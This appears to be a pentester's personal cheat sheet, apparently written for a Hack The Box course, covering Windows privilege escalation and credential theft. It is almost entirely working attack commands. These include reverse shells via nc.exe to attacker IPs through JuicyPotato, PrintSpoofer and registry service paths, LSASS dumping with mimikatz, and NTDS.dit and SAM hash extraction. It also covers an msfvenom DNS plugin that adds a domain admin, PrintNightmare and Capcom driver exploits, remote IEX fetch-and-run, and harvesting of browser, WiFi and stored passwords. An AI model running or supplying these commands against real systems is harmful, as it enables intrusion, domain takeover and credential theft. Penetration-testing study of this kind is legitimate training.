Find some useful information on the network : 

```python
arp -a
route print
```

Enumerating Protections : 

```python
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

test app-locker security : 

```python
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

Get some useful information:
```python
tasklist /svc
set
systeminfo
wmic qfe
#or 
Get-HotFix | ft -AutoSize
```

Installed Programs :

```python
wmic product get name
#or 
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Display Running Processes : 

```python
netstat -ano
```
Logged-In Users :
```python
query user
query session
```
Current user and privileges:
```python
echo %USERNAME%
whoami /priv
```

Get all group : 
```python
net localgroup
```

Get Password Policy & Other Account Information : 
```python
net accounts
net user
```

Listing Named Pipes : 
https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist
```python
pipelist.exe /accepteula
#or 
gci \\.\pipe\
#or
Get-ChildItem "\\.\pipe\" | Where-Object { -not $_.PsIsContainer } | ForEach-Object { Write-Output "Named Pipe: $($_.FullName)" }
```

enumerate the permissions : 
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
download accesschk : 
#Powershell_wget
```python
Invoke-WebRequest -Uri "http://10.10.16.100:8080/accesschk64.exe" -OutFile "C:\Users\htb-student\Desktop\accesschk64.exe"
```

```python 
accesschk /accepteula \\.\Pipe\lsass -v #for lsass
#with powershell 
.\accesschk64.exe \pipe\SQLLocal\SQLEXPRESS01 -v 
```

##### SeImpersonate and SeAssignPrimaryToken

PrintSpoofer : 
```python
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
```
Juicy potatoes :
```python
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
download netcat : 
```python
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe

C:\Tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.100 8443 -e cmd"
```

##### SeDebugPrivilege

Dump LSASS: 

```python
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
https://github.com/ParrotSec/mimikatz/tree/master/x64
https://download.sysinternals.com/files/Procdump.zip

Tools : 
https://github.com/decoder-it/psgetsystem
command: 
```python
./psgetsys.ps1 ;[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC

##### SeTakeOwnershipPrivilege

```python
 Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

cmd /c dir /q 'C:\Department Shares\Private\IT'
```

```python
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```



#### Windows Built-in group

##### Backup Operators
https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

import module : 
```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Enabling SeBackupPrivilege :
```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```

Copy Protected file  : 
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
Can Also use Robocopy to copy file : 

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
##### Attacking a Domain Controller - Copying NTDS.dit

```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit


```

Copying NTDS.dit Locally : 
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

##### Extract local account credentials : 
```powershell
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

##### Extracting ntds.dit with DS internal for the administrator user : 

https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1
```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

##### Extracting Hashes Using SecretsDump

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

##### Event Log Readers

```shell
net localgroup "Event Log Readers"

wevtutil qe Security /rd:true /f:text | Select-String "/user"

wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

```

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### DnsAdmins

```powershell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

Get-ADGroupMember -Identity DnsAdmins

dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

##### Finding User's SID
```powershell
wmic useraccount where name="netadm" get sid
```

##### Checking Permissions on DNS Service
```powershell
sc.exe sdshow DNS
```

Restart Dns service : 
```sh
sc stop dns
sc start dns
```

verify : 
```powershell 
net group "Domain Admins" /dom
```
Then finally logout and login to update !
#### Using Mimilib.dll

www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

#### Creating a WPAD Record

##### Disabling the Global Query Block List

```powershell
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

##### Adding a WPAD Record
```powershell
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.16.100
```

#### Hyper-V Administrators
https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/

#### Print Operators

if no `SeLoadDriverPrivilege` need to bypass UAC : 
https://github.com/hfiref0x/UACME

https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

##### Privesc `Capcom.sys`
```powershell
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

##### Verify Privilege is Enabled
```powershell
EnableSeLoadDriverPrivilege.exe
```

##### Verify Capcom Driver is Listed
```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```
Exploit : 
```powershell
PS C:\htb> .\ExploitCapcom.exe
```

#### Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

Code: c

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

#### Automating the Steps

```powershell
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

#### Server Operators

##### Checking Service Permissions with PsService
```sh
 sc qc AppReadiness
```
tool : 
https://learn.microsoft.com/en-us/sysinternals/downloads/psservice

```cmd-session
c:\Tools\PsService.exe security AppReadiness
```
##### Checking Local Admin Group Membership

```sh
net localgroup Administrators
```
##### Modifying the Service Binary Path

```sh
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

##### Retrieve Credential :

```shell
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

#### User Account Control

##### Confirming UAC is Enabled

```shell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

##### Checking UAC Level

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

##### Checking Windows Version

```powershell
[environment]::OSVersion.Version
```

https://en.wikipedia.org/wiki/Windows_10_version_history
https://egre55.github.io/system-properties-uac-bypass/

##### Reviewing Path Variable

```powershell
cmd /c echo %PATH%
```

##### Testing Connection
```shell
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
``` 

## Weak Permissions

#### Permissive File System ACLs
##### Permissive File System ACLs
https://github.com/GhostPack/SharpUp/
```powershell
 .\SharpUp.exe audit
```
##### Replacing Service Binary

```sh
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
#then start the service
```

#### Weak Service Permissions

```sh
SharpUp.exe audit

accesschk.exe /accepteula -quvcw WindscribeService

sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

```
#### Searching for Unquoted Service Paths

```sh
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Permissive Registry ACLs
#### Checking for Weak Service ACLs in Registry
```cmd-session
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

#### Changing ImagePath with PowerShell

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary

#### Check Startup Programs

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

#### Switch user cmd

https://github.com/antonioCoco/RunasCs

```sh
Runas.exe Administrator password "cmd /c whoami "
```

Privesc github : 
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

## Kernel Exploits
#### Checking Permissions on the SAM File
```sh
icacls c:\Windows\System32\config\SAM
```

HiveNightmare : 
https://github.com/GossiTheDog/HiveNightmare

recover hash: 
```shell
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

#### Checking for Spooler Service

We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.

Kernel Exploits

```powershell
PS C:\htb> ls \\localhost\pipe\spoolss
```

#### Adding Local Admin with PrintNightmare PowerShell PoC

First start by #bypass_power_policies [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```

Now we can import the PowerShell script and use it to add a new local admin user.

Kernel Exploits

```powershell-session
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```


#### Examining Installed Updates

```powershell-session
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808

## Vulnerable Services

#### Enumerating Installed Programs

```cmd
C:\htb> wmic product get name
```

#### Enumerating Local Ports

```cmd
netstat -ano | findstr 6064
```

#### Enumerating Process ID

```powershell
get-process -Id 3324
```

#### Enumerating Running Service

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

### DLL Injection 

 - LoadLibrary
 - Manual Mapping
 - Reflective DLL Injection : https://github.com/stephenfewer/ReflectiveDLLInjection
 - DLL Hijacking

## Credential Hunting

### Application Configuration Files

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

```
cat \path\ | Select-String password
```

### Dictionary Files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## PowerShell History File

```sh
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Confirming PowerShell History Save Path
```powershell-session
(Get-PSReadLineOption).HistorySavePath
```

#### Reading PowerShell History File
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### Decrypting PowerShell Credentials

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

https://github.com/SnaffCon/Snaffler

## Manually Searching the File System for Credentials

```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

```cmd
findstr /si password *.xml *.ini *.txt *.config
```

```cmd
findstr /spin "password" *.*
```

```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

```cmd
 where /R C:\ *.config
```

#### Search for File Extensions Using PowerShell

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

#### Viewing Sticky Notes Data Using PowerShell
https://github.com/RamblingCookieMonster/PSSQLite

```powershell
Set-ExecutionPolicy Bypass -Scope Process


cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

```

#### Listing Saved Credentials

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
```cmd
C:\htb> cmdkey /list
```

#### Run Commands as Another User
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
## Browser Credentials
https://github.com/GhostPack/SharpDPAPI

```powershell
.\SharpChrome.exe logins /unprotect
```

## Password Managers
`.kdbx`
#### Extracting KeePass Hash

```sh
python keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```
## Email
https://github.com/dafthack/MailSniper

## Tools
https://github.com/AlessandroZ/LaZagne

```powershell
.\lazagne.exe all
```

or

https://github.com/Arvanaghi/SessionGopher

```powershell-session
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Windows AutoLogon

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Enumerating Sessions and Finding Credentials:

```powershell-session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

## Wifi Passwords

```cmd
netsh wlan show profile
```

#### Retrieving Saved Wireless Passwords

```cmd
netsh wlan show profile ilfreight_corp key=clear
```

## Citrix Breakout

Search on internet !!!

## Additional Techniques

#### Running Monitor Script on Target Host

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```
https://github.com/DanMcInerney/net-creds